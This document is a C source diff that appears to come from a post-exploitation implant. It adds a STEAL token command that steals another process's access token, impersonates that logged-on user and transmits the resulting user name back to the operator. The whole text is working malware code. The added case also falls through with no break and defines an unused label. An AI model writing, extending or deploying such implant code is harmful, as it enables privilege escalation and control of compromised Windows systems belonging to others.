@@ -363,16 +363,34 @@ FUNC VOID CommandToken(
             bkHeapFree( UserThreadToken, UserThreadTokenLen );  
         }
         case STEAL: {
-            DWORD  ProcessId   = ParserGetInt32( Parser );
-            HANDLE TokenHandle = NULL;
-            BOOL   bCheck      = FALSE;
+            DWORD  ProcessId    = ParserGetInt32( Parser );
+            HANDLE TokenHandle  = NULL;
+            BOOL   bCheck       = FALSE;
+            PSTR   UserToken    = NULL;
+            DWORD  UserTokenLen = 0;
              
             bCheck = TokenSteal( ProcessId, &TokenHandle );
             if ( !bCheck ) {
                 PackageTransmitError( NtLastError() ); return;
             }
 
-            Instance()->Win32.
+            bCheck = Instance()->Win32.ImpersonateLoggedOnUser( TokenHandle );
+            if ( !bCheck ) {
+                PackageTransmitError( NtLastError() ); return;
+            }
+
+            bkHandleClose( TokenHandle );
+    
+            TokenHandle = NtCurrentProcessToken();
+
+            GetTokenUserA( TokenHandle, &UserToken, &UserTokenLen );
+
+            PackageAddString( BK_PACKAGE, UserToken );
+            PackageTransmit( BK_PACKAGE, NULL, NULL );
+
+        __Leave:
+            if ( TokenHandle ) bkHandleClose( TokenHandle );
+            if ( UserToken   ) bkHeapFree( UserToken, UserTokenLen );
         }
     
         default:
